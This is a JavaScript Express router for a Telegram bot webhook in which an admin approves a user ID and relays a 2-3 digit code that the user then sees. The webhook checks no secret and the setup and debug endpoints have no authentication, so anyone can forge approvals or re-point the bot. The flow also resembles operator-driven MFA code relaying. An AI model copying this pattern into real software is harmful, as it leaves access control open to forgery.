/**
 * Telegram Bot Webhook Handler for APPAUTH
 * 
 * This script should be set up as a webhook handler for your Telegram bot.
 * When admin clicks APPAUTH button, it will prompt them to send a verification code.
 * 
 * Setup:
 * 1. Set your webhook URL to point to this endpoint
 * 2. Bot will listen for callback_query with /appauth command
 * 3. Admin sends verification code as a reply
 * 4. Code is forwarded to frontend via /api/appauth/code endpoint
 */

import express from "express";
import axios from "axios";

const router = express.Router();

// Store pending auth sessions (userId -> waiting for code)
const pendingAuthSessions = new Map();

/**
 * Webhook endpoint for Telegram bot updates
 * POST /api/telegram/webhook
 */
router.post("/webhook", async (req, res) => {
  try {
    const update = req.body;
    console.log('[TELEGRAM WEBHOOK] ============================================');
    console.log('[TELEGRAM WEBHOOK] Received update:', JSON.stringify(update, null, 2));

    // Handle callback query (button click)
    if (update.callback_query) {
      const callbackData = update.callback_query.data;
      const chatId = update.callback_query.message.chat.id;
      const messageId = update.callback_query.message.message_id;

      console.log('[TELEGRAM] ✅ Callback query detected!');
      console.log('[TELEGRAM] Callback data:', callbackData);
      console.log('[TELEGRAM] Chat ID:', chatId);

      // Check if it's an APPAUTH callback
      if (callbackData.startsWith('/appauth ')) {
        const userId = callbackData.split(' ')[1];
        
        console.log('[TELEGRAM] 🔑 APPAUTH button clicked!');
        console.log('[TELEGRAM] User ID:', userId);
        console.log('[TELEGRAM] Admin is approving user...');
        
        try {
          // Directly approve the user - send to backend
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
          console.log('[TELEGRAM] Backend URL:', backendUrl);
          console.log('[TELEGRAM] Calling:', `${backendUrl}/api/appauth/approve`);
          
          const response = await axios.post(
            `${backendUrl}/api/appauth/approve`,
            {
              userId: userId
            },
            {
              timeout: 10000
            }
          );

          console.log('[TELEGRAM] ✅ Backend response:', response.data);

          if (response.data.success) {
            // Answer the callback query
            await axios.post(
              `https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`,
              {
                callback_query_id: update.callback_query.id,
                text: "✅ User approved!"
              }
            );

            // Confirm to admin
            await axios.post(
              `https://api.telegram.org/bot${process.env.BOT}/sendMessage`,
              {
                chat_id: chatId,
                text: `✅ Access Granted!\n\nUser ID: ${userId}\nUser has been approved and will be redirected to Done page.`
              }
            );

            console.log('[TELEGRAM] ✅ User approved successfully!');
            console.log('[TELEGRAM] User should now be redirected to Done page');
          } else {
            throw new Error('Backend returned success: false');
          }
        } catch (error) {
          console.error('[TELEGRAM] ❌ ERROR approving user:', error.message);
          console.error('[TELEGRAM] Error details:', error.response?.data || error);
          
          await axios.post(
            `https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`,
            {
              callback_query_id: update.callback_query.id,
              text: "❌ Error occurred"
            }
          );
          
          await axios.post(
            `https://api.telegram.org/bot${process.env.BOT}/sendMessage`,
            {
              chat_id: chatId,
              text: `❌ Error approving user:\n${error.message}`
            }
          );
        }

        return res.status(200).json({ success: true });
      } else {
        console.log('[TELEGRAM] ⚠️ Unknown callback data:', callbackData);
      }
    } else {
      console.log('[TELEGRAM] ℹ️ Not a callback query');
    }

    // Handle text message (verification code)
    if (update.message && update.message.text) {
      const chatId = update.message.chat.id;
      const text = update.message.text.trim();

      console.log('[TELEGRAM] ========================================');
      console.log('[TELEGRAM] Text message received:', text);
      console.log('[TELEGRAM] From chat ID:', chatId);
      console.log('[TELEGRAM] All sessions:', Array.from(pendingAuthSessions.keys()));

      // Check if there's a pending auth session
      const session = pendingAuthSessions.get(chatId);
      
      console.log('[TELEGRAM] Session exists for this chat:', !!session);
      
      if (session) {
        console.log('[TELEGRAM] Found session for user:', session.userId);
        console.log('[TELEGRAM] Validating code format:', text);
        // Validate the code (should be 2-3 digits)
        if (/^\d{2,3}$/.test(text)) {
          console.log('[TELEGRAM] ✅ Code format valid!');
          console.log('[TELEGRAM] Sending to backend...');
          try {
            // Send the code to the backend
            const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
            const response = await axios.post(
              `${backendUrl}/api/appauth/code`,
              {
                userId: session.userId,
                code: text
              }
            );

            console.log('[TELEGRAM] Backend response:', response.data);

            if (response.data.success) {
              // Confirm to admin
              await axios.post(
                `https://api.telegram.org/bot${process.env.BOT}/sendMessage`,
                {
                  chat_id: chatId,
                  text: `✅ Code Sent!\n\nCode: ${text}\nUser will see it now.`
                }
              );

              // Clear the session
              pendingAuthSessions.delete(chatId);
              console.log('[TELEGRAM] ✅ Session cleared successfully');
            } else {
              throw new Error("Failed to store code");
            }
          } catch (error) {
            console.error('[TELEGRAM] ❌ Error sending code:', error.message);
            await axios.post(
              `https://api.telegram.org/bot${process.env.BOT}/sendMessage`,
              {
                chat_id: chatId,
                text: `❌ Error sending code: ${error.message}`
              }
            );
          }
        } else {
          console.log('[TELEGRAM] ❌ Invalid code format');
          // Invalid code format
          await axios.post(
            `https://api.telegram.org/bot${process.env.BOT}/sendMessage`,
            {
              chat_id: chatId,
              text: `❌ Invalid format.\n\nPlease send 2-3 digits only.\nExample: 15`
            }
          );
        }

        return res.status(200).json({ success: true });
      } else {
        console.log('[TELEGRAM] ⚠️ No pending session for chat:', chatId);
        console.log('[TELEGRAM] Did you click APPAUTH first?');
      }
    }

    // Default response
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Telegram webhook error:", error);
    res.status(200).json({ success: true }); // Always return 200 to Telegram
  }
});

/**
 * Setup webhook URL
 * GET /api/telegram/setup
 */
router.get("/setup", async (req, res) => {
  try {
    const webhookUrl = req.query.url;
    
    if (!webhookUrl) {
      return res.status(400).json({
        success: false,
        message: "Webhook URL is required"
      });
    }

    const response = await axios.post(
      `https://api.telegram.org/bot${process.env.BOT}/setWebhook`,
      {
        url: webhookUrl
      }
    );

    return res.status(200).json({
      success: true,
      data: response.data
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * Get webhook info
 * GET /api/telegram/info
 */
router.get("/info", async (req, res) => {
  try {
    const response = await axios.get(
      `https://api.telegram.org/bot${process.env.BOT}/getWebhookInfo`
    );

    return res.status(200).json({
      success: true,
      data: response.data
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

/**
 * Debug endpoint to check pending sessions
 * GET /api/telegram/debug
 */
router.get("/debug", async (req, res) => {
  const sessions = Array.from(pendingAuthSessions.entries()).map(([chatId, session]) => ({
    chatId,
    userId: session.userId,
    timestamp: new Date(session.timestamp).toISOString(),
    age: Math.floor((Date.now() - session.timestamp) / 1000) + 's'
  }));

  return res.status(200).json({
    success: true,
    totalSessions: pendingAuthSessions.size,
    sessions: sessions,
    message: pendingAuthSessions.size === 0 
      ? 'No pending sessions. Click APPAUTH button first!' 
      : 'Sessions found. You can now type the code.'
  });
});

// Cleanup old sessions every 5 minutes
setInterval(() => {
  const now = Date.now();
  for (const [chatId, session] of pendingAuthSessions.entries()) {
    if (now - session.timestamp > 300000) { // 5 minutes
      pendingAuthSessions.delete(chatId);
      console.log(`Cleaned up expired auth session for chat ${chatId}`);
    }
  }
}, 300000);

export default router;
